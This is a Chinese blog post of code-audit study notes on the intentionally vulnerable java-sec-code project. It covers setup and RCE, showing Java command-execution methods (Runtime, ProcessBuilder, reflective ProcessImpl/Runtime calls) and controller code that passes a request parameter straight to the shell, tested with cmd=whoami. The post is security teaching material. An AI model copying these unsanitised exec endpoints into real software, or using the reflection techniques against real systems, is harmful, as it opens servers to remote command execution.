<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Java-sec-code学习记录 - ol4three</title><meta description="0x00 前言​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程 0x01环境配置Mac os 11.2.2tomcat 8.5ideamsyql 8.0.70  导入idea项目配置本地tomcat git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;JoyChou93&amp;#x2F;java-sec-codecd java-sec-c"><meta property="og:type" content="blog"><meta property="og:title" content="Java-sec-code学习记录"><meta property="og:url" content="http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><meta property="og:site_name" content="ol4three"><meta property="og:description" content="0x00 前言​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程 0x01环境配置Mac os 11.2.2tomcat 8.5ideamsyql 8.0.70  导入idea项目配置本地tomcat git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;JoyChou93&amp;#x2F;java-sec-codecd java-sec-c"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164104470.png"><meta property="og:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png"><meta property="article:published_time" content="2021-08-12T10:25:42.000Z"><meta property="article:modified_time" content="2022-07-14T10:58:52.607Z"><meta property="article:author" content="ol4three"><meta property="article:tag" content="Code_audit"><meta property="article:tag" content="WEB安全"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},"headline":"ol4three","image":["https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164104470.png","https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png"],"datePublished":"2021-08-12T10:25:42.000Z","dateModified":"2022-07-14T10:58:52.607Z","author":{"@type":"Person","name":"ol4three"},"description":"0x00 前言​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程 0x01环境配置Mac os 11.2.2tomcat 8.5ideamsyql 8.0.70  导入idea项目\u0004\u0003配置本地tomcat git clone https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-codecd java-sec-c"}</script><link rel="canonical" href="http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><link rel="icon" href="/img/logo.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="ol4three" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="ol4three" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/Security%20Incidents">Security Incidents</a><a class="navbar-item" href="/Vulnerabilities">Vulnerabilities</a><a class="navbar-item" href="/Read%20Team">Read Team</a><a class="navbar-item" href="/Stop%20learning">Stop learning</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-08-12T10:25:42.000Z" title="2021-08-12T10:25:42.000Z">2021-08-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-14T10:58:52.607Z" title="2022-07-14T10:58:52.607Z">2022-07-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-14T10:58:52.607Z" title="2022-07-14T10:58:52.607Z">2022-07-14</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 hours read (About 17611 words)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">Java-sec-code学习记录</h1><div class="content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程</p>
<h1 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">tomcat 8.5</span><br><span class="line">idea</span><br><span class="line">msyql 8.0.70</span><br></pre></td></tr></table></figure>

<p>导入idea项目配置本地tomcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code</span><br><span class="line">cd java-sec-code</span><br><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>打开浏览器访问127.0.0.1:8080</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png" alt="image-20210827091208429"></p>
<p>输入密码admin/admin123进行登陆</p>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="1-Rce"><a href="#1-Rce" class="headerlink" title="1. Rce"></a>1. Rce</h2><h3 id="Java命令执行的几种方式"><a href="#Java命令执行的几种方式" class="headerlink" title="Java命令执行的几种方式"></a>Java命令执行的几种方式</h3><h3 id="1）Runtime-类执行系统命令"><a href="#1）Runtime-类执行系统命令" class="headerlink" title="1）Runtime 类执行系统命令"></a>1）Runtime 类执行系统命令</h3><p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Runtime1 &#123;</span><br><span class="line"></span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process p &#x3D; Runtime.getRuntime().exec(&quot;whoami&quot;);</span><br><span class="line">                InputStream input &#x3D; p.getInputStream();</span><br><span class="line">                InputStreamReader ins &#x3D; new InputStreamReader(input, &quot;utf-8&quot;);</span><br><span class="line">                &#x2F;&#x2F;InputStreamReader 字节流到字符流，并指定编码格式</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(ins);</span><br><span class="line">                &#x2F;&#x2F;BufferedReader 从字符流读取文件并缓存字符</span><br><span class="line">                String line;</span><br><span class="line">                line &#x3D; br.readLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                br.close();</span><br><span class="line">                ins.close();</span><br><span class="line">                input.close();          </span><br><span class="line">                </span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Runtime类exec方法执行命令获取输入流getInputStream()，再InputStreamReader过渡到字符流，并指定gbk的编码格式。BufferedReader 再从字符输入流中读取文本并缓冲字符。再通过readLine()方法打印出结果。</p>
<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png" alt="image-20210827105713739"></p>
<p>查看Rce代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Rce &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;exec&quot;)</span><br><span class="line">    public String CommandExec(String cmd) &#123;</span><br><span class="line">        Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process p &#x3D; run.exec(cmd);</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (p.waitFor() !&#x3D; 0) &#123;</span><br><span class="line">                if (p.exitValue() &#x3D;&#x3D; 1)</span><br><span class="line">                    return &quot;Command exec failed!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Idea调试情况如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png" alt="image-20210827111228112"></p>
<h3 id="2）ProcessBuilder-类命令执行"><a href="#2）ProcessBuilder-类命令执行" class="headerlink" title="2）ProcessBuilder 类命令执行"></a>2）ProcessBuilder 类命令执行</h3><p>ProcessBuilder类通过创建系统进程执行命令。</p>
<p>核心代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder builder &#x3D; new ProcessBuilder(&quot;whoami&quot;);</span><br><span class="line">Process process &#x3D; builder.start();</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ProcessBuilder1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmds &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;&#125;;</span><br><span class="line">            ProcessBuilder builder &#x3D; new ProcessBuilder(cmds);</span><br><span class="line">            Process process &#x3D; builder.start();</span><br><span class="line">            InputStream in &#x3D; process.getInputStream();</span><br><span class="line">            &#x2F;&#x2F;获取输入流</span><br><span class="line">            InputStreamReader ins &#x3D; new InputStreamReader(in, &quot;utf-8&quot;);</span><br><span class="line">            &#x2F;&#x2F; 字节流转化为字符流，并指定编码格式</span><br><span class="line">            char[] chs &#x3D; new char[1024];</span><br><span class="line">            int len &#x3D; ins.read(chs);</span><br><span class="line">            System.out.println(new String(chs,0,len));</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            </span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过ProcessBuilder类执行系统命令获取结果。注意将命令隔开，同样转化为字符流InputStreamReader，并指定编码格式。read方法读取该字符流。将结果转化为字符串进行输出。</p>
<p>打开<a target="_blank" rel="noopener" href="http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png" alt="image-20210827143330503"></p>
<p>Java-sec-code如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;ProcessBuilder?cmd&#x3D;whoami</span><br><span class="line"> * @param cmd cmd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">        Process p &#x3D; processBuilder.start();</span><br><span class="line">        BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Idea调试如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png" alt="image-20210827143456512"></p>
<h3 id="3-反射调用Processlmpl-类执行系统命令"><a href="#3-反射调用Processlmpl-类执行系统命令" class="headerlink" title="3) 反射调用Processlmpl 类执行系统命令"></a>3) 反射调用Processlmpl 类执行系统命令</h3><p>Runtime和ProcessBuilder执行命令实际上调用了也是ProcessImpl类。对于该类，没有构造方法，只有一个private类型的方法。可以通过反射调用。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">Process e &#x3D; (Process) method.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, &quot;.&quot;, null, true); </span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从ProcessImpl类的class对象中获取到方法然后反射调用，获取字节输入流getInputStream的结果。ByteArrayOutputStream 创建字节数组缓冲区。read() 方法读取字节流大小，并写进缓冲区。最后将缓冲区结果转化为字符串，并指定utf-8编码格式输出。</p>
<h3 id="4-反射调用Runtime类执行系统命令"><a href="#4-反射调用Runtime类执行系统命令" class="headerlink" title="4) 反射调用Runtime类执行系统命令"></a>4) 反射调用Runtime类执行系统命令</h3><p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor constructor &#x3D; clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">Object runtimeInstance &#x3D; constructor.newInstance();</span><br><span class="line">Method runtimeMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Process process &#x3D; (Process) runtimeMethod.invoke(runtimeInstance, &quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p><code>java.lang.Runtime</code>类的无参构造方法私有的，可以通过反射修改方法的访问权限setAccessible，强制可以访问，然后获取类构造器的方法。再通过类加载newInstance()创建对象，反射再调用方法。</p>
<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-JavaScript命令执行"><a href="#5-JavaScript命令执行" class="headerlink" title="5) JavaScript命令执行"></a>5) JavaScript命令执行</h3><p>javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码.</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String str &#x3D; &quot;Jscode&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
